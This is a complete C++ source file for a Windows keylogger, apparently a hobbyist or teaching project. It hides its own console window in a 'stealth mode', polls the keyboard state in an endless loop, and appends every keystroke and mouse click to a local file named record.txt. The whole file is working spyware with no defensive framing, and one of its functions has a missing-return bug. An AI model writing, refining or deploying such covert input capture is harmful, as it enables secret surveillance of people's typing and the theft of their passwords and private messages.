#include <iostream>
#include <conio.h>
#include <windows.h>
#include <fstream>
#include <string>
using namespace std;

void StealthMode()
{
    HWND stealth; // HWND is class stealth is object
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL); // finding Console window
    ShowWindow(stealth, 0);                            // calling object stealth with visibility 0
}

class Key_Logger
{
private:
    char key;
    void Log(LPCSTR text) // created to enter the key pressed into file (LPCSTR will convert string to long pointer character)
    {
        ofstream logfile;                     // used for creating object logfile
        logfile.open("record.txt", ios::app); // used for opening file record.txt
        logfile << text;                      // Writing text in text file
        logfile.close();                      // used to close file
    }
    bool InputKey(int);

public:
    void Tracing();
};
void Key_Logger::Tracing()
{
    while (1)
    {
        Sleep(10);
        for (key = 8; key <= 190; key++)
        {
            if (GetAsyncKeyState(key) == -32767) // Condition will be true if any button is pressed
            {
                if (InputKey(key) == FALSE)
                {
                    ofstream logfile;
                    cout << key;
                    logfile.open("record.txt", ios::app);
                    logfile << key; // Writing text in text file
                    logfile.close();
                }
            }
        }
    }
}
bool Key_Logger::InputKey(int key) // will return either 1(True) or 0(False)
    {
        switch (key)
        {
        case VK_SPACE:
            cout << " "; // print space to console
            Log(" ");    // Calling Log file
            break;
        case VK_RETURN:
            cout << "\n"; // print enter to console
            Log("\n");    // Calling Log file
            break;
        case VK_SHIFT:
            cout << " <shift> "; // print <shift> to console
            Log(" <shift> ");    // Calling Log file
            break;
        case VK_BACK:
            cout << "\b"; // print back to console
            Log("\b");    // Calling Log file
            break;
        case VK_RBUTTON:
            cout << " <rclick> "; // print <rclick> to console when right mouse button is pressed
            Log(" <rclick> ");    // calling Log functon
            break;
        case VK_LBUTTON:
            cout << " <lclick> "; // print <lclick> to console when left mouse button is pressed
            Log(" <lclick> ");    // calling Log function
            break;
        case VK_MENU:
            cout << " <alt> "; // print <alt> to console when alt is pressed
            Log(" <alt> ");    // calling Log function
            break;
        case VK_CONTROL:
            cout << " <ctrl> "; // print <ctrl> to console when ctrl is pressed
            Log(" <ctrl> ");    // calling Log function
            break;
        case VK_LEFT:
            cout << " <left> "; // print <left> to console when left is pressed
            Log(" <left> ");    // calling Log function
            break;
        case VK_RIGHT:
            cout << " <right> "; // print <right> to console when right is pressed
            Log(" <right> ");    // calling Log function
            break;
        case VK_UP:
            cout << " <up> "; // print <up> to console when up is pressed
            Log(" <up> ");    // calling Log function
            break;
        case VK_DOWN:
            cout << " <down> "; // print <down> to console when down is pressed
            Log(" <down> ");    // calling Log function
            break;

        default:
            return FALSE;
        }
    }
    
int main()
{
    StealthMode(); // will call Stealth Mode
    Key_Logger k1;
    k1.Tracing();
    return 0;
}